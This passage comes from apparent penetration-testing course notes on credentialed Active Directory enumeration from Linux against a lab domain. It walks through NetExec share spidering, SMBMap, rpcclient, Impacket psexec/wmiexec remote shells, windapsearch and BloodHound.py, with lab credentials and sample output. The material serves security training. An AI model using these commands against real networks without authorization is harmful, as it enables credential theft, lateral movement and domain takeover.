identified as a domain admin. It could be an easy win if we can steal this user's credentials from memory or impersonate them.\n\nAs we will see later, `BloodHound` (and other tools such as `PowerView`) can be used to hunt for user sessions. BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways. Regardless, tools such as CME are great for more targeted enumeration and user hunting.\n\n#### CME Share Searching\n\nWe can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.\n\n#### Share Enumeration - Domain Controller\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ \n```\n\nWe see several shares available to us with `READ` access. The `Department Shares`, `User Shares`, and `ZZZ_archive` shares would be worth digging into further as they may contain sensitive data such as passwords or PII. Next, we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.\n\n#### Spider_plus\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus\n```\n\nIn the above command, we ran the spider against the `Department Shares`. When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. Below we can see a portion of the JSON output. We could dig around for interesting files such as `web.config` files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json \n\n{\n    \"Department Shares\": {\n        \"Accounting/Private/AddSelect.bat\": {\n            \"atime_epoch\": \"2022-03-31 14:44:42\",\n            \"ctime_epoch\": \"2022-03-31 14:44:39\",\n            \"mtime_epoch\": \"2022-03-31 15:14:46\",\n            \"size\": \"278 Bytes\"\n        },\n        \"Accounting/Private/ApproveConnect.wmf\": {\n            \"atime_epoch\": \"2022-03-31 14:45:14\",\n     \n<SNIP>\n```\n\nCME is powerful, and this is only a tiny look at its capabilities; it is worth experimenting with it more against the lab targets. We will utilize CME in various ways as we progress through the remainder of this module. Let's move on and take a look at [SMBMap](https://github.com/ShawnDEvans/smbmap) now.\n\n---\n\n## SMBMap\n\nSMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.\n\nLike CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems. As with other tools, we can type the command `smbmap` `-h` to view the tool usage menu. Aside from listing shares, we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more. This can be especially useful when pillaging shares for useful information.\n\n#### SMBMap To Check Access\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5\n\n[+] IP: 172.16.5.5:445\tName: inlanefreight.local                               \n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tADMIN$                                            \tNO ACCESS\tRemote Admin\n\tC$                                                \tNO ACCESS\tDefault share\n\tDepartment Shares                                 \tREAD ONLY\t\n\tIPC$                                              \tREAD ONLY\tRemote IPC\n\tNETLOGON                                          \tREAD ONLY\tLogon server share \n\tSYSVOL                                            \tREAD ONLY\tLogon server share \n\tUser Shares                                       \tREAD ONLY\t\n\tZZZ_archive                                       \tREAD ONLY\n```\n\nThe above will tell us what our user can access and their permission levels. Like our results from CME, we see that the user `forend` has no access to the DC via the `ADMIN$` or `C$` shares (this is expected for a standard user account), but does have read access over `IPC$`, `NETLOGON`, and `SYSVOL` which is the default in any domain. The other non-standard shares, such as `Department Shares` and the user and archive shares, are most interesting. Let's do a recursive listing of the directories in the `Department Shares` share. We can see, as expected, subdirectories for each department in the company.\n\n#### Recursive List Of All Directories\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only\n\n[+] IP: 172.16.5.5:445\tName: inlanefreight.local                               \n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tDepartment Shares                                 \tREAD ONLY\t\n\t.\\Department Shares\\*\n\tdr--r--r--                0 Thu Mar 31 15:34:29 2022\t.\n\tdr--r--r--                0 Thu Mar 31 15:34:29 2022\t..\n\tdr--r--r--                0 Thu Mar 31 15:14:48 2022\tAccounting\n\tdr--r--r--                0 Thu Mar 31 15:14:39 2022\tExecutives\n\tdr--r--r--                0 Thu Mar 31 15:14:57 2022\tFinance\n\tdr--r--r--                0 Thu Mar 31 15:15:04 2022\tHR\n\tdr--r--r--                0 Thu Mar 31 15:15:21 2022\tIT\n\tdr--r--r--                0 Thu Mar 31 15:15:29 2022\tLegal\n\tdr--r--r--                0 Thu Mar 31 15:15:37 2022\tMarketing\n\tdr--r--r--                0 Thu Mar 31 15:15:47 2022\tOperations\n\tdr--r--r--                0 Thu Mar 31 15:15:58 2022\tR&D\n\tdr--r--r--                0 Thu Mar 31 15:16:10 2022\tTemp\n\tdr--r--r--                0 Thu Mar 31 15:16:18 2022\tWarehouse\n\n    <SNIP>\n```\n\nAs the recursive listing dives deeper, it will show you the output of all subdirectories within the higher-level directories. The use of `--dir-only` provided only the output of all directories and did not list all files. Try this against other shares on the Domain Controller and see what you can find.\n\nNow that we've covered shares, let's look at `RPCClient`.\n\n---\n\n## rpcclient\n\n[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type `man rpcclient` into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.\n\nDue to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:\n\nCode: bash\n\n```bash\nrpcclient -U \"\" -N 172.16.5.5\n```\n\nThe above will provide us with a bound connection, and we should be greeted with a new prompt to start unleashing the power of rpcclient.\n\n#### SMB NULL Session with rpcclient\n\n![GIF showcasing the usage of rpcclient with SMB NULL session.](https://academy.hackthebox.com/storage/modules/143/rpcclient.png)\n\nFrom here, we can begin to enumerate any number of different things. Let's start with domain users.\n\n#### rpcclient Enumeration\n\nWhile looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:\n\n- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.\n- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\n- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.\n- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\n\nHowever, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the `htb-student` user.\n\n#### RPCClient User Enumeration By RID\n\nCredentialed Enumeration - from Linux\n\n```shell-session\nrpcclient $> queryuser 0x457\n\n        User Name   :   htb-student\n        Full Name   :   Htb Student\n        Home Drive  :\n        Dir Drive   :\n        Profile Path:\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST\n        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST\n        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT\n        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT\n        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT\n        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT\n        unknown_2[0..31]...\n        user_rid :      0x457\n        group_rid:      0x201\n        acb_info :      0x00000010\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x0000001d\n        padding1[0..7]...\n        logon_hrs[0..21]...\n```\n\nWhen we searched for information using the `queryuser` command against the RID `0x457`, RPC returned the user information for `htb-student` as expected. This wasn't hard since we already knew the RID for `htb-student`. If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command.\n\n#### Enumdomusers\n\nCredentialed Enumeration - from Linux\n\n```shell-session\nrpcclient $> enumdomusers\n\nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[lab_adm] rid:[0x3e9]\nuser:[htb-student] rid:[0x457]\nuser:[avazquez] rid:[0x458]\nuser:[pfalcon] rid:[0x459]\nuser:[fanthony] rid:[0x45a]\nuser:[wdillard] rid:[0x45b]\nuser:[lbradford] rid:[0x45c]\nuser:[sgage] rid:[0x45d]\nuser:[asanchez] rid:[0x45e]\nuser:[dbranch] rid:[0x45f]\nuser:[ccruz] rid:[0x460]\nuser:[njohnson] rid:[0x461]\nuser:[mholliday] rid:[0x462]\n\n<SNIP>  \n```\n\nUsing it in this manner will print out all domain users by name and RID. Our enumeration can go into great detail utilizing rpcclient. We could even start performing actions such as editing users and groups or adding our own into the domain, but this is out of scope for this module. For now, we just want to perform domain enumeration to validate our findings. Take some time to play with the other rpcclient functions and see the results they produce. For more information on topics such as SIDs, RIDs, and other core components of AD, it would be worthwhile to check out the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module. Now, it's time to plunge into Impacket in all its glory.\n\n---\n\n## Impacket Toolkit\n\nImpacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.\n\n#### Psexec.py\n\nOne of the most useful tools in the Impacket suite is `psexec.py`. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.\n\n#### Using psexec.py\n\nTo connect to a host with psexec.py, we need credentials for a user with local administrator privileges.\n\nCode: bash\n\n```bash\npsexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  \n```\n\n![GIF showcasing the usage of psexec.py, authenticating as the user wley.](https://academy.hackthebox.com/storage/modules/143/psexec-action.png)\n\nOnce we execute the psexec module, it drops us into the `system32` directory on the target host. We ran the `whoami` command to verify, and it confirmed that we landed on the host as `SYSTEM`. From here, we can perform almost any task on this host; anything from further enumeration to persistence and lateral movement. Let's give another Impacket module a try: `wmiexec.py`.\n\n#### wmiexec.py\n\nWmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.\n\n#### Using wmiexec.py\n\nCode: bash\n\n```bash\nwmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  \n```\n\n![GIF showcasing the usage of wmiexec.py, authenticating as the user wley.](https://academy.hackthebox.com/storage/modules/143/wmiexec-action.png)\n\nNote that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. In the image above, it's also apparent that the process is running under the context of user `wley` on the host, not as SYSTEM. Impacket is an immensely valuable tool that has plenty of use cases. We will see many other tools in the Impacket toolkit throughout the remainder of this module. As a pentester working with Windows hosts, this tool should always be in our arsenal. Let's move on to the next tool, `Windapsearch`.\n\n---\n\n## Windapsearch\n\n[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.\n\n#### Windapsearch Help\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ windapsearch.py -h\n\nusage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]\n                       [-p PASSWORD] [--functionality] [-G] [-U] [-C]\n                       [-m GROUP_NAME] [--da] [--admin-objects] [--user-spns]\n                       [--unconstrained-users] [--unconstrained-computers]\n                       [--gpos] [-s SEARCH_TERM] [-l DN]\n                       [--custom CUSTOM_FILTER] [-r] [--attrs ATTRS] [--full]\n                       [-o output_dir]\n\nScript to perform Windows domain enumeration through LDAP queries to a Domain\nController\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nDomain Options:\n  -d DOMAIN, --domain DOMAIN\n                        The FQDN of the domain (e.g. 'lab.example.com'). Only\n                        needed if DC-IP not provided\n  --dc-ip DC_IP         The IP address of a domain controller\n\nBind Options:\n  Specify bind account. If not specified, anonymous bind will be attempted\n\n  -u USER, --user USER  The full username with domain to bind with (e.g.\n                        'ropnop@lab.example.com' or 'LAB\\ropnop'\n  -p PASSWORD, --password PASSWORD\n                        Password to use. If not specified, will be prompted\n                        for\n\nEnumeration Options:\n  Data to enumerate from LDAP\n\n  --functionality       Enumerate Domain Functionality level. Possible through\n                        anonymous bind\n  -G, --groups          Enumerate all AD Groups\n  -U, --users           Enumerate all AD Users\n  -PU, --privileged-users\n                        Enumerate All privileged AD Users. Performs recursive\n                        lookups for nested members.\n  -C, --computers       Enumerate all AD Computers\n\n  <SNIP>\n```\n\nWe have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.\n\n#### Windapsearch - Domain Admins\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\n\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+]\tFound: DC=INLANEFREIGHT,DC=LOCAL\n[+] Attempting bind\n[+]\t...success! Binded as: \n[+]\t u:INLANEFREIGHT\\forend\n[+] Attempting to enumerate all Domain Admins\n[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n[+]\tFound 28 Domain Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@inlanefreight.local\n\ncn: lab_adm\n\ncn: Matthew Morgan\nuserPrincipalName: mmorgan@inlanefreight.local\n\n<SNIP>\n```\n\nFrom the results in the shell above, we can see that it enumerated 28 users from the Domain Admins group. Take note of a few users we have already seen before and may even have a hash or cleartext password like `wley`, `svc_qualys`, and `lab_adm`.\n\nTo identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.\n\n#### Windapsearch - Privileged Users\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\n\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=INLANEFREIGHT,DC=LOCAL\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      u:INLANEFREIGHT\\forend\n[+] Attempting to enumerate all AD privileged users\n[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n[+]     Found 28 nested users for group Domain Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@inlanefreight.local\n\ncn: lab_adm\n\ncn: Angela Dunn\nuserPrincipalName: adunn@inlanefreight.local\n\ncn: Matthew Morgan\nuserPrincipalName: mmorgan@inlanefreight.local\n\ncn: Dorothy Click\nuserPrincipalName: dclick@inlanefreight.local\n\n<SNIP>\n\n[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n[+]     Found 3 nested users for group Enterprise Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@inlanefreight.local\n\ncn: lab_adm\n\ncn: Sharepoint Admin\nuserPrincipalName: sp-admin@INLANEFREIGHT.LOCAL\n\n<SNIP>\n```\n\nYou'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.\n\n---\n\n## Bloodhound.py\n\nOnce we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or \"attack paths\" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.\n\nIt was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).\n\nRunning `bloodhound-python -h` from our Linux attack host will show us the options available.\n\n#### BloodHound.py Options\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ bloodhound-python -h\n\nusage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]\n                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]\n                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]\n                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]\n                         [--disable-pooling] [--disable-autogc] [--zip]\n\nPython based ingestor for BloodHound\nFor help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD\n                        Which information to collect. Supported: Group,\n                        LocalAdmin, Session, Trusts, Default (all previous),\n                        DCOnly (no computer connections), DCOM, RDP,PSRemote,\n                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).\n                        You can specify more than one by separating them with\n                        a comma. (default: Default)\n  -u USERNAME, --username USERNAME\n                        Username. Format: username[@domain]; If the domain is\n                        unspecified, the current domain is used.\n  -p PASSWORD, --password PASSWORD\n                        Password\n\n  <SNIP>\n```\n\nAs we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible. Let's run it this way.\n\n#### Executing BloodHound.py\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all \n\nINFO: Found AD domain: inlanefreight.local\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nINFO: Found 1 domains\nINFO: Found 2 domains in the forest\nINFO: Found 564 computers\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nINFO: Found 2951 users\nINFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nINFO: Found 183 groups\nINFO: Found 2 trusts\nINFO: Starting computer enumeration with 10 workers\n\n<SNIP>\n```\n\nThe command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.\n\n#### Viewing the Results\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls\n\n20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  \n```\n\n#### Upload the Zip File into the BloodHound GUI\n\nWe could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.\n\nNext, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:\n\n- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.\n\nOnce all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.\n\n#### Uploading the Zip File\n\n![BloodHound interface showing database info and file selection for 'BloodHound.zip' in Downloads folder.](https://academy.hackthebox.com/storage/modules/143/bh-injest.png)\n\nNow that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. We will discuss custom Cypher queries more in a later section. As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.\n\n#### Searching for Relationships\n\n![BloodHound interface displaying pre-built analytics queries and a graph of Active Directory relationships.](https://academy.hackthebox.com/storage/modules/143/bh-analysis.png)\n\nThe query chosen to produce the map above was `Find Shortest Paths To Domain Admins`. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent. This will be extremely helpful when planning our next steps for lateral movement through the network. Take some time to experiment with the various features: look at the `Database Info` tab after uploading data, search for a node such as `Domain Users` and, scroll through all of the options under the `Node Info` tab, check out the pre-built queries under the `Analysis` tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries by selecting some interesting ones from the Cypher cheatsheet linked above, pasting them into the `Raw Query` box at the bottom, and hitting enter. You can also play with the `Settings` menu by clicking the gear icon on the right side of the screen and adjusting how nodes and edges are displayed, enable query debug mode, and enable dark mode. Throughout the remainder of this module, we will use BloodHound in various ways, but for a dedicated study on the BloodHound tool, check out the [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound) module.\n\nIn the next section, we will cover running the SharpHound collector from a domain-joined Windows host and work through some examples of working with the data in the BloodHound GUI.\n\n---\n\nWe experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host. As a quick note, if you haven't checked out the [WADComs project](https://wadcoms.github.io/) yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even [contributing](https://wadcoms.github.io/contribute/) to!\n\nNow, let's switch gears and start digging into the INLANEFREIGHT.LOCAL domain from our Windows attack host.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/16-Credentialed Enumeration - from Windows",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/16-Credentialed Enumeration - from Windows.md",
    "title": "16 Credentialed Enumeration   From Windows",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- In the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumer...",
    "category": "02_CPTS",
    "content": "\n---\n\nIn the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumerating from a Windows attack host, such as SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools useful for AD enumeration. Some of the data we gather in this phase may provide more information for reporting, not just directly lead to attack paths. Depending on the assessment type, our client may be interested in all possible findings, so even issues like the ability to run BloodHound freely or certain user account attributes may be worth including in our report as either medium-risk findings or a separate appendix section. Not every issue we uncover has to be geared towards forwarding our attacks. Some of the results may be informational in nature but useful to the customer to help improve their security posture.\n\nAt this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.\n\n---\n\n## TTPs\n\nThe first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.\n\n---\n\n## ActiveDirectory PowerShell Module\n\nThe ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.\n\nBefore we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.\n\n#### Discover Modules\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> 